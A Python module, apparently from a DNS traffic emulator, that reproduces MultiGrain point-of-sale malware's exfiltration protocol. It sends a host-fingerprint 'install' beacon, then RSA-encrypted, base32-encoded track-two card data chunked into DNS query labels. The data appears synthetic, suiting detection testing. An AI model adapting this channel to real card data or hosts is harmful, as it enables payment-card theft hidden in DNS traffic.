import asyncio
import base64

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding

from tdns.exfil import exfil, limit_size, SEND_GETHOST, MAX_LBL_SIZE


class multigrainpos(exfil):

    idchar = 'm'

    def __init__(self, public_key, init_delay=60, card_type=None, amount=5000,
                 time=1, method=SEND_GETHOST, resolver_addr=None, random_delay=False, prepend=True):
        '''
        args:
            public_key: An RSAPublicKey, should be 1024 bits.
            init_delay: The time between the 'install' message and the first exfiltrated card.
            card_type: Same as in 'frameworkpos'.
            amount: The total amount of messages, including the initial install message
        '''
        super().__init__(amount, time, method, resolver_addr, random_delay, prepend)
        self.card_type = card_type
        self.key = public_key
        self.init_delay = init_delay
        self.vsn = self.custom_data.volume_serial_number()
        self.mac = self.data.mac_address()
        self.hostname = self.data.hostname(0)
        self.version = self.data.windows_platform_token().encode('ASCII')

    def encode(self, text: bytes):
        return base64.b32encode(text)

    def encrypt(self, text: bytes):
        return self.key.encrypt(
            text,
            padding.OAEP(
                mgf=padding.MGF1(hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )

    '''
    http://www.cse.yorku.ca/~oz/hash.html
    '''
    def djb2hash(self, text: str):
        hsh = 5381
        for c in text:
            hsh = hsh * 33 + ord(c)
        return hsh & 0xffffffff

    @limit_size
    def install(self):
        mac = self.mac[-14:]
        hashed_data = str(self.djb2hash(self.vsn + mac)).encode('ASCII')
        data = hashed_data + self.hostname.encode('ASCII') + self.version
        data = self.encode(data).decode()
        return f'install.{data}.{self.domain}'

    @limit_size
    def card(self):
        to_send = self.custom_data.track_two(self.card_type).encode('ASCII')
        to_send = self.encrypt(to_send)
        to_send = self.encode(to_send).decode()
        to_send = '.'.join(to_send[i:i+MAX_LBL_SIZE]
                           for i in range(0, len(to_send), MAX_LBL_SIZE))
        return f'log.{to_send}.{self.domain}'

    async def exfiltration(self):
        qname = self.install()
        self.amount -= 1
        await self.method(qname)
        await asyncio.sleep(self.init_delay)

        while self.amount > 0:
            qname = self.card()
            await self.method(qname)
            self.amount -= 1
            await asyncio.sleep(self.delay())

    async def call__aux(self):
        multigrain = asyncio.create_task(self.exfiltration())
        await multigrain
